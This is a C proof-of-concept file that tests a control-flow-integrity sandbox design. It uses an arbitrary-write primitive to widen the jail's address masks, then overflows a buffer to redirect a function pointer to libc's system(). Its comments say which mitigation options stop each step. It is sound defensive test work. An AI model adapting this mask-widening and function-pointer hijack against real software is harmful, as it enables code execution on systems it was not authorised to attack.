/* mask_attack_poc.c — the attack the 21-Oct design did not survive.
 *
 * Standard CFI threat model: the attacker has an arbitrary-write bug, not just
 * a linear overflow. Step 1 uses it to WIDEN THE JAIL (write ormask = 0 and
 * andmask = all ones, so the clamp lets every address through). Step 2 is the
 * usual hijack: overwrite a function pointer with libc's system().
 *
 *   21-Oct design (writable masks)      : step 1 succeeds, step 2 runs a shell
 *   Option B now (masks page read-only) : step 1 faults (SIGSEGV), no shell
 *   Option D (pcrel)                    : the clamp reads no memory at all, so
 *                                         step 1 changes nothing that matters;
 *                                         step 2 is clamped and dies, no shell
 *
 * The mask address is taken from the symbol here; a real exploit would compute
 * it from an information leak. Build: -DOLD_MASKS for the 21-Oct runtime names.
 *   usage: mask_attack_poc        (always attacks)
 */
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#ifdef OLD_MASKS
extern uint64_t __jail_ormask  __attribute__((weak, visibility("hidden")));
extern uint64_t __jail_andmask __attribute__((weak, visibility("hidden")));
#define ORP  (&__jail_ormask)
#define ANDP (&__jail_andmask)
#else
extern uint64_t __jail_masks[2] __attribute__((weak, visibility("hidden")));
#define ORP  (&__jail_masks[0])
#define ANDP (&__jail_masks[1])
#endif

struct S { char buf[16]; void (*fp)(const char *); };
static void log_cb(const char *m) { printf("[cb] legitimate callback: %s\n", m); }

/* the attacker's arbitrary-write primitive */
__attribute__((noinline)) static void arb_write(volatile uint64_t *where, uint64_t what) {
    *where = what;
}

int main(void) {
    struct S s; s.fp = log_cb;
    printf("[poc] step 1: widen the jail via arbitrary write (mask at %p)\n", (void *)ORP);
    fflush(stdout);
    if (ORP) { arb_write(ORP, 0); arb_write(ANDP, ~(uint64_t)0); }
    printf("[poc] step 1 succeeded: masks now %#lx / %#lx\n",
           (unsigned long)*ORP, (unsigned long)*ANDP);
    void *target = dlsym(RTLD_DEFAULT, "system");
    unsigned char payload[sizeof s.buf + sizeof s.fp];
    memset(payload, 'A', sizeof s.buf);
    memcpy(payload + sizeof s.buf, &target, sizeof target);
    volatile size_t n = sizeof payload;
    memcpy(s.buf, payload, n);                  /* step 2: classic overflow */
    printf("[poc] step 2: fp -> %p (system)\n", (void *)s.fp);
    fflush(stdout);
    s.fp("echo '*** SHELL ESCAPE: jail bypassed ***'");
    printf("[poc] returned normally\n");
    return 0;
}
